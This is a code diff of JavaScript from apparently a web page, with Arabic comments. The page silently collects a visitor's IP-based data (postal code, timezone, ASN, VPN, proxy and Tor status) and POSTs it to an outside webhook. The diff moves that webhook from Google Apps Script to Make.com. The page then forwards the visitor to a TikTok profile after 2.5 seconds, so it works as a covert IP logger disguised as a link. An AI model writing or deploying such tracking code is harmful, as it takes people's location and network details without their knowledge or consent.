@@ -134,31 +134,32 @@
         userData.postal = ipData.postal;
         userData.timezone = ipData.timezone;
         userData.asn = ipData.asn ? ipData.asn.asn : null;
-        userData.vpn = ipData.privacy && ipData.privacy.vpn ? true : false;
-        userData.proxy = ipData.privacy && ipData.privacy.proxy ? true : false;
-        userData.tor = ipData.privacy && ipData.privacy.tor ? true : false;
+        userData.vpn = ipData.privacy?.vpn || false;
+        userData.proxy = ipData.privacy?.proxy || false;
+        userData.tor = ipData.privacy?.tor || false;
       } catch (err) {
         console.error('IPInfo Error:', err);
       }
 
-      // إرسال البيانات إلى Google Apps Script
-fetch("https://script.google.com/macros/s/AKfycbyJnRBWWu2BnnoFmTmAPCOECbyLvdy8ahGuIPHCWu3VNAEOIb9MPUSrp6Bbpkul-aOKPA/exec", {
-  method: "POST",
-  body: JSON.stringify(userData),
-  headers: {
-    "Content-Type": "application/json"
-  }
-})
-.then(response => response.text())
-.then(data => {
-  console.log("تم الإرسال:", data);
-})
-.catch(error => {
-  console.error("خطأ في الإرسال:", error);
-});
+      // ✅ إرسال البيانات إلى Webhook الخاص بـ Make
+      fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
+        method: "POST",
+        body: JSON.stringify(userData),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log("✅ تم الإرسال إلى Make:", data);
+      })
+      .catch(error => {
+        console.error("❌ خطأ في الإرسال:", error);
+      });
 
+      // 🔁 التحويل إلى TikTok بعد ثانيتين ونصف
       setTimeout(() => {
-        window.location.href ="https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
+        window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
       }, 2500);
     }
 
